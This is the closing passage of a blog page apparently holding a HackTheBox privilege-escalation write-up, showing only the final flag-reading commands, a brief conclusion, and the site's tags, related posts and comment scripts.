+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>cat flag.txt 
+</span></span><span class=line><span class=cl>HTB{pr1v1l363_**********_2_r007}
+</span></span></code></pre></td></tr></table></div></div><h3 id=conclusion>Conclusion</h3><p>In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.</p><p>Remember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.</p><p>dr0idbot signing off.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/hackthebox/>HackTheBox</a>
+<a href=/tags/ssh_keys/>SSH_Keys</a>
+<a href=/tags/privilegeescalation/>PrivilegeEscalation</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>Last updated on Aug 11, 2023 00:00 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/dancing/><div class=article-image><img src=/p/dancing/Completed.966b0b42ce416c347087019d2f81ed6e_hu8858487233303112627.png width=250 height=150 loading=lazy alt="Featured image of post DANCING" data-key=dancing data-hash="md5-lmsLQs5BbDRwhwGdL4Htbg=="></div><div class=article-details><h2 class=article-title>DANCING</h2></div></a></article><article class=has-image><a href=/p/public-exploits/><div class=article-image><img src=/p/public-exploits/Metasploit.8f95d812029576a936c909e7fc397f11_hu6906735231513760573.png width=250 height=150 loading=lazy alt="Featured image of post Public Exploits" data-key=public-exploits data-hash="md5-j5XYEgKVdqk2yQnn/Dl/EQ=="></div><div class=article-details><h2 class=article-title>Public Exploits</h2></div></a></article><article class=has-image><a href=/p/web-enumeration/><div class=article-image><img src=/p/web-enumeration/Web.599b8031390ec50deff27b1edce1b785_hu17930960930281706334.jpg width=250 height=150 loading=lazy alt="Featured image of post Web Enumeration" data-hash="md5-WZuAMTkOxQ3v8nse3OG3hQ=="></div><div class=article-details><h2 class=article-title>Web Enumeration</h2></div></a></article><article class=has-image><a href=/p/simplectf/><div class=article-image><img src=/p/simplectf/Banner.8afd2593e8a752df696a2fc7b739d67d_hu10838505933346604782.png width=250 height=150 loading=lazy alt="Featured image of post SimpleCTF" data-hash="md5-iv0lk+inUt9pai/HtznWfQ=="></div><div class=article-details><h2 class=article-title>SimpleCTF</h2></div></a></article><article class=has-image><a href=/p/keep-it-simple/><div class=article-image><img src=/p/keep-it-simple/The%20eye.c126b683445eddb93c126436958d19a4_hu4154549417894148585.jpg width=250 height=150 loading=lazy alt="Featured image of post Keep it Simple" data-hash="md5-wSa2g0Re3bk8EmQ2lY0ZpA=="></div><div class=article-details><h2 class=article-title>Keep it Simple</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 hushkat</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
